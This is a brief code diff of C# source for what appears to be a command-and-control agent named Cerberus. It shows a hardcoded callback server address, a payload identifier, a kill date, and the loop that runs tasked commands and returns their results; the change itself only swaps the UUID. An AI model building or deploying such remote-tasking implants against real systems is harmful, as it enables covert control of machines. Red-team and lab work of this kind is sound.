@@ -24,7 +24,7 @@ namespace Cerberus
 
         private static string serverAddress = "10.0.2.128";
         private static int serverPort = 80;
-        private static string PayloadUUID = "54fe5c8c-83c4-49b8-944d-5ef28d66a622";
+        private static string PayloadUUID = "e6217f41-9065-457a-a330-826a3c488642";
         private static string UUID = "";
         private string killdate = "";
 
@@ -92,6 +92,7 @@ namespace Cerberus
             {
                 var result = command.Execute(task);
                 SendTaskResult(task, result);
+
             }
             catch (Exception ex)
             {
